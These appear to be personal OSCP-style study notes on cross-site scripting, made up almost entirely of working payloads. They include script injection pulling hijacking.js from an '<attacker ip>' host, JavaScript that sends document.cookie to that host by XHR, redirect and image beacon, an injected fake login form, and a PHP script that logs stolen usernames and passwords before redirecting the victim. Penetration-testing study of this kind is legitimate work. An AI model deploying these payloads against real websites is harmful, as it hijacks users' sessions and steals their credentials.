Payload

https://www.youtube.com/watch?v=KHwVjzWei1c
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss

```js
<script>alert(window.origin)</script>
<script>alert(document.domain)</script>
<img src="" onerror="alert(window.origin)">
```

Session Hijacking

testing payload

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss

```js
// remote script
<script src="http://<attacker ip>"></script>
// note that html in the front
'><script src="http://<attacker ip>"></script>
"><script src="http://<attacker ip>"></script>
```

hijacking.js

```js
// enter a workable payload into the vulnerability input field
"><script src="http://<attacker ip>/hijacking.js"></script>
```

```js
// hijacking.js
// sudo python3 -m http.server 80
var oReq = new XMLHttpRequest();
oReq.open('GET', 'http://<attacker ip>/?output='+document.cookie, true);
oReq.send()

// hijacking.js
document.location='http://<attacker ip>/?output='+document.cookie;
// hijacking.js
new Image().src='http://<attacker ip>/?output='+document.cookie;
// and so on
```

using cookie to access (e.g., Firefox DevTools)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/XSS/XSS_Login.png)

Phishing

```js
// confirm that the request can be sent out normally
document.write('<div><form id="form" action="http://<attacker ip>/phishing.php"><input type="text" id="username" name="username"><input type="password" id="pass" name="password"><button type="submit">Submit form</button></form></div>');
```

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("phishing.log", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://<target ip>/index.php");
    fclose($file);
    exit();
}
?>
```